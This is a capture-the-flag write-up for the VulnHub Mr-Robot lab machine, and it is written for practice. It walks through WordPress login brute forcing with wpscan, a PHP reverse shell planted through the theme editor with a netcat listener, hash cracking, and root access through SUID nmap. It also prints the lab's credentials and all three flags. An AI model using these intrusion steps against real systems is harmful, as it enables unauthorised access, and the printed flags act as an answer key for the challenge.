---
title: "Mr-Robot - VulnHub"
description: "Writeup for Mr-Robot, a themed machine based on the TV series, with multiple attack vectors."
pubDate: 2024-10-22
platform: "vulnhub"
category: "machines"
difficulty: "medium"
os: "linux"
language: en
tags: ["wordpress", "bruteforce", "suid"]
retired: false
heroImage: "/images/writeups/vulnhub/mrrobot-card.png"
---

# Mr-Robot - VulnHub Writeup

**Difficulty**: Medium  
**OS**: Linux  
**Platform**: VulnHub

## Reconnaissance

```bash
nmap -sC -sV -p- 192.168.1.101
```

**Open Ports:**
- 80/tcp (HTTP - Apache)
- 443/tcp (HTTPS - Apache)

## Web Enumeration

We find a Mr. Robot themed website running WordPress.

### Interesting files:

- `/robots.txt` - Contains `key-1-of-3.txt` and `fsocity.dic`
- `/wp-login.php` - WordPress login panel

**First key**: `073403c8a58a1f80d943455fb30724b9`

## Brute Force

We use `fsocity.dic` to brute force the WordPress login:

```bash
wpscan --url http://192.168.1.101 -U elliot -P fsocity.dic
```

**Credentials**: `elliot:ER28-0652`

## Initial Shell

We upload a PHP reverse shell through WordPress theme editor.

```bash
nc -lvnp 4444
```

## Privilege Escalation

We find credentials in `/home/robot`:
- `password.raw-md5`: `c3fcd3d76192e4007dfb496cca67e13b`

We crack the hash: `abcdefghijklmnopqrstuvwxyz`

Looking for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

We find `nmap` with SUID:

```bash
nmap --interactive
!sh
```

Root shell!

## Flags

- **Key 1**: `073403c8a58a1f80d943455fb30724b9`
- **Key 2**: `822c73956184f694993bede3eb39f959`
- **Key 3**: `04787ddef27c3dee1ee161b21670b4e4`

## Conclusion

Very fun and themed machine, ideal for practicing WordPress and basic privilege escalation.
